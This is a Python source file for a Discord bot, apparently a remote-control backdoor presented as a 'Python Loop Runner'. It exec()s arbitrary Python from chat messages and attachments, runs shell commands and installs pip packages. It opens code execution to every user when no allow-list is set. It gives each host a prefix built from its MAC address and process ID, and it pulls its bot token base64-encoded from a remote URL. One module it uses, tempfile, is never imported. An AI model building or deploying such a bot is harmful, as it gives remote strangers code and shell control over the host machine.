import discord
from discord.ext import commands
import asyncio
import sys
import re
import time
import os
import gc
import glob
import signal
import psutil
import uuid
import winreg
import io
import traceback
import subprocess
import requests
import threading
import numpy
import random
import secrets
import multiprocessing
import math
import urllib.request
import urllib.error
import base64
import ctypes

# ============================
# CAU HINH
# ============================

SERVER_ID         = f"{uuid.getnode()}-{os.getpid()}"
TOKEN_URL         = ""
PREFIX            = f"!{SERVER_ID}"
MAX_OUTPUT_LENGTH = 1800
EXEC_TIMEOUT      = 0              # 0 = khong timeout
MAX_TASKS         = 999999
MAX_TASKS_PER_USER= 999999
MIN_INTERVAL      = float(os.environ.get("MIN_INTERVAL", "1.0"))
MAX_DURATION      = float("inf")   # khong gioi han thoi gian
PROCESS_POOL_SIZE = int(os.environ.get("PROCESS_POOL_SIZE", "10"))
CREATE_NO_WINDOW = 0x08000000

_raw_ids = os.environ.get("ALLOWED_USER_IDS", "")
ALLOWED_USER_IDS  = [int(x.strip()) for x in _raw_ids.split(",") if x.strip().isdigit()]

# ============================
# GLOBAL STATE
# ============================

task_registry: dict[str, dict] = {}
process_semaphore: asyncio.Semaphore = None

# ============================
# BOT INIT
# ============================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=[f"{PREFIX} ", PREFIX], intents=intents, help_command=None)

# ============================
# HELPERS
# ============================

def is_allowed(user_id: int) -> bool:
    return (not ALLOWED_USER_IDS) or (user_id in ALLOWED_USER_IDS)

def fmt_time(s: float) -> str:
    if s < 60:   return f"{s:.0f}s"
    if s < 3600: return f"{s/60:.1f}m"
    return f"{s/3600:.1f}h"

def fmt_output(text: str) -> str:
    text = (text or "").strip()
    if not text: return "*(no output)*"
    if len(text) > MAX_OUTPUT_LENGTH:
        text = text[:MAX_OUTPUT_LENGTH] + "\n...(cat)"
    return f"```\n{text}\n```"

def clean_code(code: str) -> str:
    code = code.strip()
    if code.startswith("```"):
        lines = code.split("\n")
        end = -1 if lines[-1].strip() == "```" else len(lines)
        code = "\n".join(lines[1:end])
    elif code.startswith("`") and code.endswith("`"):
        code = code[1:-1]
    return code.strip()

def tasks_by_user(user_id: int) -> list:
    return [t for t in task_registry.values() if t["user_id"] == user_id]

def get_mem_mb() -> float:
    return psutil.Process(os.getpid()).memory_info().rss / 1024 / 1024

# ============================
# SUBPROCESS EXECUTOR
# ============================

async def execute_python(code: str) -> tuple:
    stdout_f = io.StringIO()
    stderr_f = io.StringIO()
    
    async with process_semaphore:
        try:
            def sync_task():
                from contextlib import redirect_stdout, redirect_stderr
                with redirect_stdout(stdout_f), redirect_stderr(stderr_f):
                    # Globals cho phep truy cap bot va cac thu vien da import
                    ctx_globals = globals().copy()
                    exec(code, ctx_globals)
            
            await asyncio.to_thread(sync_task)
            return stdout_f.getvalue(), stderr_f.getvalue(), 0
        except Exception:
            return stdout_f.getvalue(), traceback.format_exc(), 1

# ============================
# LOOP WORKER
# ============================

async def loop_worker(task_id: str):
    info     = task_registry[task_id]
    channel  = bot.get_channel(info["channel_id"])
    start    = info["start_time"]
    infinite = info["infinite"]
    duration = info["duration"]
    interval = info["interval"]
    code     = info["code"]

    try:
        while True:
            if task_id not in task_registry:
                break
            elapsed = time.time() - start
            if not infinite and elapsed >= duration:
                break

            info["iteration"] += 1
            out, err, rc = await execute_python(code)
            info["last_output"] = out or err or "(no output)"
            info["last_rc"]     = rc
            info["last_run"]    = time.time()

            remaining = "inf" if infinite else fmt_time(max(0, duration - elapsed))
            color = discord.Color.green() if rc == 0 else discord.Color.red()

            embed = discord.Embed(title="Loop dang chay", color=color)
            embed.add_field(name="Task",    value=f"`{task_id[:8]}`",       inline=True)
            embed.add_field(name="Vong",    value=f"`#{info['iteration']}`", inline=True)
            embed.add_field(name="Elapsed", value=f"`{fmt_time(elapsed)}`",  inline=True)
            embed.add_field(name="Con lai", value=f"`{remaining}`",          inline=True)
            embed.add_field(name="Interval",value=f"`{interval}s`",          inline=True)
            embed.add_field(name="RAM",     value=f"`{get_mem_mb():.1f}MB`", inline=True)
            if out: embed.add_field(name="Output", value=fmt_output(out), inline=False)
            if err: embed.add_field(name="Error",  value=fmt_output(err), inline=False)
            embed.set_footer(text=f"{PREFIX}stop {task_id[:8]} de dung")

            try:
                if info["status_msg"]:
                    await info["status_msg"].edit(embed=embed)
            except (discord.NotFound, discord.HTTPException):
                pass

            await asyncio.sleep(interval)

    except asyncio.CancelledError:
        elapsed = time.time() - start
        embed = discord.Embed(
            title="Task dung",
            color=discord.Color.blue(),
            description=f"Task `{task_id[:8]}` dung sau {fmt_time(elapsed)} ({info['iteration']} vong)."
        )
        try:
            if info["status_msg"]: await info["status_msg"].edit(embed=embed)
            elif channel: await channel.send(embed=embed)
        except: pass
        return

    except Exception as e:
        if channel: await channel.send(f"Task `{task_id[:8]}` crash: `{e}`")

    finally:
        task_registry.pop(task_id, None)

    elapsed = time.time() - start
    embed = discord.Embed(
        title="Task hoan thanh",
        color=discord.Color.green(),
        description=f"Task `{task_id[:8]}` chay {info['iteration']} vong trong {fmt_time(elapsed)}."
    )
    try:
        if info["status_msg"]: await info["status_msg"].edit(embed=embed)
        elif channel: await channel.send(embed=embed)
    except: pass

# ============================
# TAO TASK
# ============================

async def create_loop_task(message, code, duration, interval, source_name="inline"):
    user_id  = message.author.id
    channel  = message.channel
    infinite = (duration == 0)
    task_id  = str(uuid.uuid4())

    if len(task_registry) >= MAX_TASKS:
        await channel.send(f"Bot dang chay toi da {MAX_TASKS} tasks!")
        return
    if len(tasks_by_user(user_id)) >= MAX_TASKS_PER_USER:
        await channel.send(f"Ban dang chay toi da {MAX_TASKS_PER_USER} tasks!")
        return
    if interval < MIN_INTERVAL:
        await channel.send(f"Interval toi thieu la {MIN_INTERVAL}s!")
        return

    label = "inf" if infinite else fmt_time(duration)
    embed = discord.Embed(
        title="Task moi bat dau!",
        color=discord.Color.orange(),
        description=(
            f"ID: `{task_id[:8]}`\n"
            f"Thoi gian: `{label}` | Interval: `{interval}s`\n"
            f"Dung `{PREFIX}stop {task_id[:8]}` de dung."
        )
    )
    c = code[:300] + "..." if len(code) > 300 else code
    embed.add_field(name="Code", value=f"```python\n{c}\n```", inline=False)
    embed.set_author(name=message.author.display_name, icon_url=message.author.display_avatar.url)
    embed.set_footer(text=f"Nguon: {source_name}")
    status_msg = await channel.send(embed=embed)

    info = {
        "task_id":     task_id,
        "task":        None,
        "user_id":     user_id,
        "channel_id":  channel.id,
        "code":        code,
        "start_time":  time.time(),
        "duration":    duration,
        "infinite":    infinite,
        "interval":    interval,
        "iteration":   0,
        "last_output": "",
        "last_rc":     0,
        "last_run":    None,
        "status_msg":  status_msg,
    }
    task_registry[task_id] = info
    task = asyncio.create_task(loop_worker(task_id))
    info["task"] = task
    return task_id

# ============================
# DOC CODE TU FILE DINH KEM
# ============================

async def get_code_from_message(message: discord.Message, raw_code: str):
    for attachment in message.attachments:
        fname = attachment.filename.lower()
        if fname.endswith(".py") or fname.endswith(".txt"):
            if attachment.size > 512 * 1024:
                await message.channel.send("File qua lon! Toi da 512KB.")
                return None
            try:
                data = await attachment.read()
                return data.decode("utf-8", errors="replace")
            except Exception as e:
                await message.channel.send(f"Khong doc duoc file: `{e}`")
                return None

    if raw_code:
        return clean_code(raw_code)

    await message.channel.send(f"Vui long nhap code hoac dinh kem file .py!")
    return None

# ============================
# ON MESSAGE
# ============================

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return

    content = message.content.strip()

    if content in ["/listid", "!listid"]:
        await message.channel.send(f"Server ID: `{SERVER_ID}`")
        return

    has_attachment = any(
        a.filename.lower().endswith((".py", ".txt"))
        for a in message.attachments
    )

    match = re.match(
        r"^" + re.escape(PREFIX) + r"\s*run(\d+)?(?:i(\d+(?:\.\d+)?))?(?:[ \t]+([\s\S]+))?$",
        content, re.IGNORECASE
    )

    if not match and has_attachment:
        match = re.match(
            r"^" + re.escape(PREFIX) + r"\s*run(\d+)?(?:i(\d+(?:\.\d+)?))?$",
            content, re.IGNORECASE
        )

    if match:
        dur_str      = match.group(1)
        interval_str = match.group(2)
        raw_code     = match.group(3) if match.lastindex and match.lastindex >= 3 else None

        if not is_allowed(message.author.id):
            await message.channel.send("Ban khong co quyen!")
            return

        code = await get_code_from_message(message, raw_code)
        if not code:
            return

        interval    = float(interval_str) if interval_str else MIN_INTERVAL
        source_name = message.attachments[0].filename if message.attachments else "inline"

        if dur_str is None:
            async with message.channel.typing():
                out, err, rc = await execute_python(code)
            embed = discord.Embed(
                title="Python Runner",
                color=discord.Color.green() if rc == 0 else discord.Color.red()
            )
            embed.set_author(name=message.author.display_name, icon_url=message.author.display_avatar.url)
            c = code[:500] + "..." if len(code) > 500 else code
            embed.add_field(name="Code",   value=f"```python\n{c}\n```", inline=False)
            if out: embed.add_field(name="Output", value=fmt_output(out), inline=False)
            if err: embed.add_field(name="Error",  value=fmt_output(err), inline=False)
            if not out and not err: embed.add_field(name="Info", value="*(no output)*", inline=False)
            embed.set_footer(text=f"Exit: {rc} | Nguon: {source_name}")
            await message.reply(embed=embed)
            return

        await create_loop_task(message, code, float(dur_str), interval, source_name)
        return

    await bot.process_commands(message)

# ============================
# LENH STOP
# ============================

@bot.command(name="stop")
async def stop_cmd(ctx, task_prefix: str = None):
    user_id  = ctx.author.id
    is_admin = ctx.author.guild_permissions.administrator

    if task_prefix:
        matches = [(tid, i) for tid, i in task_registry.items() if tid.startswith(task_prefix)]
        if not matches:
            await ctx.send(f"Khong tim thay task `{task_prefix}`.")
            return
        tid, info = matches[0]
        if info["user_id"] != user_id and not is_admin:
            await ctx.send("Task nay khong phai cua ban!")
            return
        info["task"].cancel()
        await ctx.message.add_reaction("\u23f9\ufe0f")
        return

    my_tasks = [(tid, i) for tid, i in task_registry.items()
                if i["user_id"] == user_id and i["channel_id"] == ctx.channel.id]
    if not my_tasks:
        await ctx.send("Ban khong co task nao dang chay trong channel nay.")
        return
    for _, info in my_tasks:
        info["task"].cancel()
    await ctx.send(f"Da dung {len(my_tasks)} task.")


@bot.command(name="stopall")
async def stopall_cmd(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("Chi admin!"); return
    n = len(task_registry)
    for info in list(task_registry.values()):
        info["task"].cancel()
    await ctx.send(f"Da dung tat ca {n} task.")


@bot.command(name="restart")
async def restart_cmd(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("Chi admin!"); return

    n = len(task_registry)
    for info in list(task_registry.values()):
        info["task"].cancel()

    await ctx.send(f"Dang restart bot... Da dung {n} task. Bot se online lai sau ~10 giay.")
    await asyncio.sleep(2)
    os.kill(os.getpid(), signal.SIGTERM)

# ============================
# XEM TASK
# ============================

@bot.command(name="tasks", aliases=["loops"])
async def all_tasks_cmd(ctx):
    is_admin = ctx.author.guild_permissions.administrator
    items = list(task_registry.values())
    if not is_admin:
        items = [i for i in items if i["user_id"] == ctx.author.id]
    if not items:
        await ctx.send("Khong co task nao dang chay."); return

    embed = discord.Embed(
        title=f"Tasks dang chay ({len(items)})",
        color=discord.Color.orange(),
        description=(
            f"RAM Bot: `{get_mem_mb():.1f}MB` | "
            f"CPU: `{psutil.cpu_percent()}%` | "
            f"Uptime: `{fmt_time(time.time()-START_TIME)}`"
        )
    )
    for info in items[:10]:
        elapsed   = time.time() - info["start_time"]
        remaining = "inf" if info["infinite"] else fmt_time(max(0, info["duration"]-elapsed))
        user = bot.get_user(info["user_id"])
        ch   = bot.get_channel(info["channel_id"])
        embed.add_field(
            name=f"`{info['task_id'][:8]}` #{ch.name if ch else '?'}",
            value=(
                f"{user.display_name if user else '?'} | {fmt_time(elapsed)} | con lai: {remaining}\n"
                f"Vong #{info['iteration']} | {info['interval']}s"
            ),
            inline=False
        )
    await ctx.send(embed=embed)


@bot.command(name="status")
async def status_cmd(ctx):
    mem = psutil.virtual_memory()
    total_mb = mem.total / (1024 * 1024)
    used_mb = mem.used / (1024 * 1024)
    bot_mem = get_mem_mb()
    
    cpu_usage = psutil.cpu_percent()
    uptime = fmt_time(time.time() - START_TIME)
    
    embed = discord.Embed(title="Bot Status", color=discord.Color.green())
    embed.add_field(name="System RAM", value=f"`{used_mb:.1f} MB / {total_mb:.1f} MB ({mem.percent}%)`", inline=False)
    embed.add_field(name="Bot RAM", value=f"`{bot_mem:.1f} MB`", inline=True)
    embed.add_field(name="CPU Usage", value=f"`{cpu_usage}%`", inline=True)
    embed.add_field(name="Uptime", value=f"`{uptime}`", inline=True)
    embed.set_footer(text=f"Server ID: {SERVER_ID}")
    await ctx.send(embed=embed)


@bot.command(name="mytasks")
async def my_tasks_cmd(ctx):
    items = tasks_by_user(ctx.author.id)
    if not items:
        await ctx.send("Ban khong co task nao."); return
    embed = discord.Embed(title=f"Tasks cua ban ({len(items)})", color=discord.Color.blurple())
    for info in items:
        elapsed   = time.time() - info["start_time"]
        remaining = "inf" if info["infinite"] else fmt_time(max(0, info["duration"]-elapsed))
        embed.add_field(
            name=f"`{info['task_id'][:8]}`",
            value=f"{fmt_time(elapsed)} | con lai: {remaining} | vong #{info['iteration']}",
            inline=True
        )
    embed.set_footer(text=f"{PREFIX}stop <id> de dung")
    await ctx.send(embed=embed)

# ============================
# SHELL & PIP (admin)
# ============================

@bot.command(name="shell", aliases=["cmd"])
async def shell_cmd(ctx, *, cmd: str = None):
    if not ALLOWED_USER_IDS or ctx.author.id not in ALLOWED_USER_IDS:
        await ctx.send("Chi admin!"); return
    if not cmd:
        await ctx.send("Nhap lenh!"); return
    async with ctx.typing():
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        try:
            out, err = await asyncio.wait_for(proc.communicate(), 30)
            rc = proc.returncode
        except asyncio.TimeoutError:
            proc.kill(); out, err, rc = b"", b"Timeout", -1
    embed = discord.Embed(title="Shell", color=discord.Color.blue() if rc==0 else discord.Color.red())
    embed.add_field(name="Lenh", value=f"`{cmd}`", inline=False)
    if out: embed.add_field(name="Output", value=fmt_output(out.decode()), inline=False)
    if err: embed.add_field(name="Stderr", value=fmt_output(err.decode()), inline=False)
    await ctx.reply(embed=embed)


@bot.command(name="pip")
async def pip_cmd(ctx, *, pkg: str = None):
    if not ALLOWED_USER_IDS or ctx.author.id not in ALLOWED_USER_IDS:
        await ctx.send("Chi admin!"); return
    if not pkg:
        await ctx.send(f"{PREFIX}pip <package>"); return
    msg = await ctx.send(f"Dang cai `{pkg}`...")
    proc = await asyncio.create_subprocess_shell(
        f"{sys.executable} -m pip install {pkg}",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    out, err = await proc.communicate()
    if proc.returncode == 0:
        await msg.edit(content=f"Da cai `{pkg}`!")
    else:
        await msg.edit(content=f"Loi:\n{fmt_output(err.decode())}")

# ============================
# HELP
# ============================

@bot.command(name="help")
async def help_cmd(ctx):
    embed = discord.Embed(title="Python Loop Runner", color=discord.Color.blurple())
    embed.add_field(name="!listid",                     value="Xem Server ID (khong can prefix)", inline=False)
    embed.add_field(name=f"{PREFIX}run <code>",         value="Chay 1 lan",                   inline=False)
    embed.add_field(name=f"{PREFIX}run0 <code>",        value="Lap vinh vien (1s/vong)",       inline=False)
    embed.add_field(name=f"{PREFIX}run0i10 <code>",     value="Lap vinh vien, nghi 10s/vong", inline=False)
    embed.add_field(name=f"{PREFIX}run300i5 <code>",    value="Lap 300s, nghi 5s/vong",       inline=False)
    embed.add_field(name=f"{PREFIX}stop",               value="Dung task trong channel nay",  inline=False)
    embed.add_field(name=f"{PREFIX}stop <id>",          value="Dung task theo ID",             inline=False)
    embed.add_field(name=f"{PREFIX}stopall",            value="Dung tat ca (admin)",           inline=False)
    embed.add_field(name=f"{PREFIX}restart",            value="Restart bot (admin)",           inline=False)
    embed.add_field(name=f"{PREFIX}status",             value="Kiem tra RAM/CPU he thong",     inline=False)
    embed.add_field(name=f"{PREFIX}tasks / {PREFIX}mytasks", value="Xem task dang chay",      inline=False)
    embed.set_footer(text=f"RAM: {get_mem_mb():.1f}MB | Tasks: {len(task_registry)}")
    await ctx.send(embed=embed)

# ============================
# AUTO CLEANUP
# ============================

async def auto_cleanup():
    while True:
        await asyncio.sleep(60)
        try:
            for f in glob.glob(os.path.join(tempfile.gettempdir(), "tmp*.py")):
                try:
                    if time.time() - os.path.getmtime(f) > 30:
                        os.unlink(f)
                except: pass
            dead = [tid for tid, info in list(task_registry.items()) if info["task"].done()]
            for tid in dead:
                task_registry.pop(tid, None)
            gc.collect()
        except: pass

# ============================
# EVENTS
# ============================

START_TIME = time.time()

@bot.event
async def on_ready():
    print(f"Bot online: {bot.user} | Servers: {len(bot.guilds)} | Server ID: {SERVER_ID}")
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{PREFIX}help | 24/7 Render"
        )
    )
    asyncio.create_task(auto_cleanup())

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"Loi: `{error}`")

# ============================
# MAIN
# ============================

async def fetch_remote_token():
    while True:
        try:
            response = await asyncio.to_thread(requests.get, TOKEN_URL, timeout=10)
            if response.status_code == 200:
                # Lay chuoi Base64 tu URL, loai bo khoang trang
                b64_content = response.content.decode("utf-8").strip()
                if b64_content:
                    # Giai ma Base64
                    try:
                        decoded_bytes = base64.b64decode(b64_content)
                        token = decoded_bytes.decode("utf-8").strip()
                        # Loai bo cac ky tu khong in duoc hoac khoang trang thua trong token
                        token = "".join(token.split())
                        return token
                    except Exception as e:
                        print(f"Loi giai ma Base64: {e}. Co the du lieu tren URL khong dung dinh dang.")
            else:
                print(f"Loi lay token (Status: {response.status_code}). Thu lai sau 5s...")
        except Exception as e:
            print(f"Loi ket noi khi lay token: {e}. Thu lai sau 5s...")
        await asyncio.sleep(5)

async def main():
    global process_semaphore
    process_semaphore = asyncio.Semaphore(PROCESS_POOL_SIZE)

    while True:
        token = await fetch_remote_token()
        try:
            await bot.start(token)
        except Exception as e:
            print(f"Bot ngat ket noi hoac loi: {e}. Thu lai sau 5s...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
